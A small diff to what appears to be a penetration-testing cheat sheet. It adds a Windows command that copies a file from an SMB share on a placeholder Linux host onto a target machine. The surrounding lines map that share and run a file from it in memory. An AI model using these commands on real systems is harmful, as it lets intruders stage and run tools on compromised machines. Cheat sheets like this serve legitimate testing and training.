@@ -1762,6 +1762,8 @@ net use \\Lin_IP_here\share_name_here
 cd \\Lin_IP_here\share_name_here_can_be_different_from_above\
 ## load file from share + execute in memory
 //Lin_IP_here/share_here/file_here arg_here
+## copy file from share to box
+copy //Lin_IP_here/share_here/file_here C:\path\to\file\on\box
 ```
 
 
